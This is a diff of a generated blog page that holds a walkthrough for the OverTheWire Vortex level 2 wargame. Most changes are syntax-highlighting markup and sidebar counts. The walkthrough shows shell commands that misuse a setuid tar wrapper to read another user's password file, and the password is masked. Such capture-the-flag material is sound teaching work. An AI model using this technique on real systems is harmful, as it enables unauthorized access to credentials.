@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -122,9 +122,9 @@
                 <div id="niu2-main-content">
                     <p>Solution for <a href="http://www.overthewire.org/wargames/vortex/vortex2.shtml">level2</a>:</p>
 <p>Here is the code:</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;sys/types.h&gt;</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
 
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
@@ -134,27 +134,27 @@
 <span class="p">}</span>
 </pre></div>
 <p><strong>$$</strong> expands to the process ID of the shell.</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$$</span>
+<div class="highlight"><pre><span></span>$ <span class="nb">echo</span> <span class="nv">$$</span>
 24489
 </pre></div>
 <p>Let's make some observations:</p>
-<div class="highlight"><pre>vortex2@melissa:~<span class="nv">$ </span>ls -l /etc/vortex_pass/vortex3 
+<div class="highlight"><pre><span></span>vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
 -r-------- <span class="m">1</span> vortex3 vortex3 <span class="m">10</span> 2011-11-14 18:15 /etc/vortex_pass/vortex3
-vortex2@melissa:~<span class="nv">$ </span>ls -l /vortex/vortex2
+vortex2@melissa:~$ ls -l /vortex/vortex2
 -r-sr-x--- <span class="m">1</span> vortex3 vortex2 <span class="m">7134</span> 2011-11-13 23:07 /vortex/vortex2
 </pre></div>
 <p>The password file is owned by <strong>vortex3</strong>. And the binary <strong>/vortex/vortex3</strong> is allowed to read this file. So we are allowed to tar this file using the binary. The binary itself expects 3 arguments. There we go:</p>
-<div class="highlight"><pre>vortex2@melissa:/etc/vortex_pass<span class="nv">$ </span>/vortex/vortex2 vortex3 vortex3 vortex3 
+<div class="highlight"><pre><span></span>vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3 
 /bin/tar: U<span class="se">\2</span>11<span class="se">\3</span>45WVS<span class="se">\3</span>50Z: Cannot stat: No such file or directory
 /bin/tar: Exiting with failure status due to previous errors
-vortex2@melissa:/etc/vortex_pass<span class="nv">$ </span>ls -l <span class="s1">'/tmp/ownership.$$.tar'</span>
+vortex2@melissa:/etc/vortex_pass$ ls -l <span class="s1">'/tmp/ownership.$$.tar'</span>
 -rw-r--r-- <span class="m">1</span> vortex3 vortex2 <span class="m">10240</span> 2012-10-31 18:59 /tmp/ownership.<span class="nv">$$</span>.tar
-vortex2@melissa:/etc/vortex_pass<span class="nv">$ </span><span class="nb">cd</span> /tmp/****
-vortex2@melissa:/tmp/****<span class="nv">$ </span>cp <span class="s1">'/tmp/ownership.$$.tar'</span> .
+vortex2@melissa:/etc/vortex_pass$ <span class="nb">cd</span> /tmp/****
+vortex2@melissa:/tmp/****$ cp <span class="s1">'/tmp/ownership.$$.tar'</span> .
 cp: cannot create regular file <span class="sb">`</span>./ownership.<span class="nv">$$</span>.tar<span class="err">'</span>: Permission denied
 </pre></div>
 <p>Obviously we are not allowed to copy/untar the file. What about STDOUT?</p>
-<div class="highlight"><pre><span class="nv">$ </span>tar xf <span class="s1">'/tmp/ownership.$$.tar'</span> -O
+<div class="highlight"><pre><span></span>$ tar xf <span class="s1">'/tmp/ownership.$$.tar'</span> -O
 *******
 </pre></div>
 <p>Password revealed. Next level!</p>
@@ -199,7 +199,7 @@ cp: cannot create regular file <span class="sb">`</span>./ownership.<span class=
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/coding/">coding</a><sup>26</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/vortex/">vortex</a><sup>3</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/appsec/">appsec</a><sup>25</sup></div>
                 </div>
